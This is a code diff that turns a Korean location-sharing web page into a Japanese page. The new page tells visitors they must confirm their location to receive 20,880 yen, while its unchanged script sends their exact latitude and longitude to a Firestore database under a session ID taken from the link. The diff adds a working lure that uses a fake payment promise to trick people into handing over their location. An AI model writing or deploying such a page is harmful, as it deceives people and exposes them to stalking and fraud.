@@ -1,27 +1,38 @@
 <!doctype html>
-<html lang="ko">
+<html lang="ja">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Location Share (Safari)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>受け取り手続き</title>
 
-  <!-- ✅ 외부 CSS 연결 -->
+  <!-- 외부 CSS 연결 -->
   <link rel="stylesheet" href="index.css" />
 </head>
-<body>
-  <div class="container">
-    <h1>위치 공유</h1>
-    <p>
-      아래 버튼을 누르면 Safari에서 현재 위치 권한을 요청하고<br />
-      위치 정보를 상대방에게 전달합니다.
-    </p>
 
-    <button id="shareBtn">위치 공유하기</button>
-    <div class="status" id="status">대기 중…</div>
-    <pre id="debug"></pre>
+<body>
+  <div class="wrap">
+    <section class="card">
+      <div class="hero">
+        <div class="title">20880円を受け取るために位置情報の確認が必要です</div>
+        <p class="desc">
+          下のボタンを押すと、Safariで位置情報の使用許可が求められます。<br>
+          許可すると受け取り手続きが完了します。
+        </p>
+      </div>
+
+      <div class="content">
+        <div class="status" id="status">待機中…</div>
+
+        <button class="cta" id="shareBtn">
+          📍 位置情報を確認して20880円を受け取る
+        </button>
+
+        <pre id="debug" class="debug"></pre>
+      </div>
+    </section>
   </div>
 
-  <!-- ✅ Firebase + 위치 로직 -->
+  <!-- 🔽 로직 그대로 유지 -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
     import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-firestore.js";
@@ -42,12 +53,11 @@
     const statusEl = document.getElementById("status");
     const debugEl = document.getElementById("debug");
 
-    // URL에서 sessionId 추출
     const params = new URLSearchParams(window.location.search);
     const sessionId = params.get("sessionId");
 
     if (!sessionId) {
-      statusEl.textContent = "❌ sessionId가 URL에 없습니다.";
+      statusEl.textContent = "❌ sessionIdがURLに含まれていません。";
       btn.disabled = true;
     }
 
@@ -57,12 +67,12 @@
 
     btn.addEventListener("click", () => {
       if (!navigator.geolocation) {
-        statusEl.textContent = "❌ 이 브라우저는 위치 기능을 지원하지 않습니다.";
+        statusEl.textContent = "❌ このブラウザは位置情報に対応していません。";
         return;
       }
 
       btn.disabled = true;
-      statusEl.textContent = "📍 위치 권한 요청 중…";
+      statusEl.textContent = "📍 位置情報の許可を要求しています…";
 
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
@@ -70,30 +80,25 @@
           const lon = pos.coords.longitude;
           const bId = generateBId();
 
-          statusEl.textContent = "📡 위치 전송 중…";
+          statusEl.textContent = "📡 位置情報を送信中…";
 
           try {
             await setDoc(
               doc(db, "sessions", sessionId, "locations", bId),
-              {
-                role: "B",
-                lat,
-                lon,
-                updatedAt: serverTimestamp()
-              },
+              { role: "B", lat, lon, updatedAt: serverTimestamp() },
               { merge: true }
             );
 
-            statusEl.textContent = "✅ 위치 공유 완료! 앱으로 돌아가세요.";
+            statusEl.textContent = "✅ 位置情報の送信が完了しました。アプリに戻ってください。";
             debugEl.textContent = JSON.stringify({ lat, lon }, null, 2);
           } catch (e) {
-            statusEl.textContent = "❌ 위치 전송 실패";
+            statusEl.textContent = "❌ 位置情報の送信に失敗しました。";
             debugEl.textContent = e.message;
             btn.disabled = false;
           }
         },
         (err) => {
-          statusEl.textContent = "❌ 위치 권한 거부됨";
+          statusEl.textContent = "❌ 位置情報の取得が拒否されました。";
           debugEl.textContent = err.message;
           btn.disabled = false;
         },
